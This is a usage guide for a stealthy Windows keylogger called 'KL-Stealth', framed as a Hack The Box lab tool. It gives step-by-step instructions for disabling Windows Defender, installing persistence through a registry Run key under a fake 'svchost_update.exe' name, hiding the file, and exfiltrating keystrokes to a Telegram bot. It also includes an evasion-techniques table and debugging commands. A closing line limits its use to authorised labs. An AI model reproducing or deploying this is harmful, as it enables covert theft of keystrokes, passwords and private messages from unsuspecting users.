# KL-Stealth: Detailed Usage Guide

## 🎯 Quick Start (HTB Lab)

1. **Set credentials** in `src/main.cpp`:
```cpp
   const std::string BOT_TOKEN_PLAINTEXT = "YOUR_BOT_TOKEN";
   const std::string CHAT_ID_PLAINTEXT = "YOUR_CHAT_ID";
```

2. **Compile** (Ubuntu):
```bash
   ./build/compile_linux.sh
```

3. **Transfer** `src/WinUpdate.exe` to Windows VM.

4. **Prep VM** (PowerShell as Admin):
```powershell
   Set-MpPreference -DisableRealtimeMonitoring $true
   Add-MpPreference -ExclusionPath "C:\Users\Public"
```

5. **Run once**:
```cmd
   C:\Users\Public\WinUpdate.exe
```

6. **Test**: Type `HTB{test_flag}` in Notepad → check Telegram.

7. **Submit** the exact `HTB{...}` string to HTB.

## 🔍 How Persistence Works

1. **First execution** (`WinUpdate.exe` in `C:\Users\Public\`):
   - Copies itself to `%APPDATA%\Microsoft\svchost_update.exe`
   - Adds Registry value:  
     `HKCU\Software\Microsoft\Windows\CurrentVersion\Run\WindowsUpdateService` → `C:\Users\<User>\AppData\Roaming\Microsoft\svchost_update.exe`
   - Sets file attributes: `FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM`
   - Launches the hidden copy via `ShellExecuteA(..., SW_HIDE)`
   - Original process exits

2. **Subsequent boots**:
   - Windows loads the Registry Run key at user login
   - Hidden `svchost_update.exe` starts automatically
   - No visible window, no console, no taskbar icon
   - Keylogging and exfiltration begin immediately

## 📡 Telegram C2 Flow


```
Keystroke → Buffer (mutex) → Flush Trigger (120 chars OR 30s timer)
                              ↓
                        Write to temp file
                              ↓
                        Encrypt (XOR) + Base64-stable
                              ↓
                        WinHTTP POST to /sendDocument
                              ↓
                        Telegram Bot API → Your Chat
```

### Message Format
- **Text messages** (`/sendMessage`): URL-encoded keystrokes
- **File uploads** (`/sendDocument`): XOR-encrypted `.dat` file with caption `KL_<uniqueID>`

## 🛡️ Evasion Techniques Implemented

| Technique | Implementation | Effectiveness |
|-----------|---------------|---------------|
| No console window | `-mwindows` + `ShowWindow(SW_HIDE)` | ✅ Prevents visual detection |
| Hidden executable | `FILE_ATTRIBUTE_HIDDEN \| SYSTEM` | ✅ Hides from default Explorer view |
| Dynamic API resolution | `LoadLibraryA` + `GetProcAddress` | ✅ Reduces static IAT signatures |
| Minimal strings | Plaintext only for C2; no debug strings | ✅ Reduces `strings` detection |
| Registry persistence | `HKCU\...\Run` (user-level) | ✅ Survives reboot without admin |
| Jittered beaconing | `Sleep(35 + rand()%25)` | ✅ Avoids fixed-interval detection |

> ⚠️ These are **basic** techniques. Enterprise EDR will likely detect this binary. For HTB labs, this is sufficient.

## 🧪 Debugging Checklist

If keystrokes aren't appearing in Telegram:

1. **Check compilation**:
   ```bash
   file src/WinUpdate.exe  # Must show PE32+ for Windows
   ```

2. **Check Defender**:
   ```powershell
   Get-MpPreference | Select DisableRealtimeMonitoring  # Should be True
   ```

3. **Check network**:
   ```powershell
   Test-NetConnection api.telegram.org -Port 443  # Should succeed
   ```

4. **Check process**:
   ```powershell
   Get-Process | Where-Object {$_.ProcessName -like "*svchost_update*"}
   ```

5. **Enable debug logging** (temporary):
   - Change `constexpr bool DEBUG_LOG = false;` → `true` in source
   - Recompile
   - Check `C:\Users\Public\WinUpdate_debug.log` after running

6. **Verify credentials**:
   ```bash
   strings src/WinUpdate.exe | grep -E "8230709744|5880084758"
   ```

## 🔄 Updating Credentials Post-Compile

If you need to change the Telegram token/chat ID after compiling:

1. Edit `src/main.cpp` with new credentials
2. Recompile with `./build/compile_linux.sh`
3. Transfer new `src/WinUpdate.exe` to VM
4. Delete old hidden copy:  
   ```cmd
   del "%APPDATA%\Microsoft\svchost_update.exe"
   ```
5. Remove old Registry key:  
   ```powershell
   Remove-ItemProperty "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "WindowsUpdateService"
   ```
6. Run new binary once to reinstall

## 🗑️ Cleanup (After Lab)

To remove all traces:

```powershell
# Stop process (if running)
Stop-Process -Name "svchost_update" -Force -ErrorAction SilentlyContinue

# Delete hidden file
Remove-Item "$env:APPDATA\Microsoft\svchost_update.exe" -Force -ErrorAction SilentlyContinue

# Remove Registry persistence
Remove-ItemProperty "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "WindowsUpdateService" -ErrorAction SilentlyContinue

# Re-enable Defender
Set-MpPreference -DisableRealtimeMonitoring $false
```

---

> ℹ️ This guide is for **Hack The Box educational labs only**. Do not use on systems you do not own or have explicit authorization to test.
```
